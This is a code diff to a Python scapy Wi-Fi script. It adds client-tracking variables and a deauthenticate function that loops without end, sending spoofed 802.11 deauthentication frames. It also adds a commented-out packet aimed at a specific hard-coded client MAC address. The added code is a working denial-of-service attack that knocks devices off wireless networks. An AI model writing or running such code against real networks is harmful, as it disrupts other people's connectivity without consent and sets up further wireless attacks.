@@ -5,7 +5,11 @@ import pandas
 import time
 from scapy.all import *
 
-time_to_sniff = 20
+flag = True
+time_to_sniff = 10
+observedclients = []
+stamgmtstypes = (0, 2, 4)
+interfaceglob = ""
 
 # initialize the networks dataframe that will contain all access points nearby
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
@@ -46,12 +50,27 @@ def change_to_monitor(interface):
 def test(packet):
     temp = "68:ff:7b:b5:aa:e4"
     if packet.haslayer(Dot11):
-        if packet[Dot11].addr1 == temp:
+        if packet[Dot11].addr2 == temp:
             print("********** new packet **********")
-            print (packet[Dot11].addr2)
+            print (packet[Dot11].addr1)
+
+
+    # pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1="28:16:7f:fc:97:f1", addr2=temp, addr3=temp)/scapy.all.Dot11Deauth()
+    # scapy.all.sendp(pkt, iface=interfaceglob, count=1, inter=.2, verbose=0)
+    # if packet.type == 0 and packet.subtype in stamgmtstypes: #Managment frame
+    #     # if(packet.addr2 == "28:16:7f:fc:97:f1"):
+    #     if packet.addr2 not in observedclients:
+    #             print (packet.addr2)
+    #             observedclients.append(packet.addr2)
+        
+def deauthenticate(iface, destMac, srcMac):
+    while flag:
+        pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1=destMac, addr2=srcMac, addr3=srcMac)/scapy.all.Dot11Deauth()
+        scapy.all.sendp(pkt, iface=interfaceglob, count=1, inter=.2, verbose=0)
          
 if __name__ == "__main__":
     # interface = sys.argv[1]
+    # interfaceglob = sys.argv[1]
     # change_to_monitor(interface)
     # sniffer = sniff(prn=test, iface=interface)
 
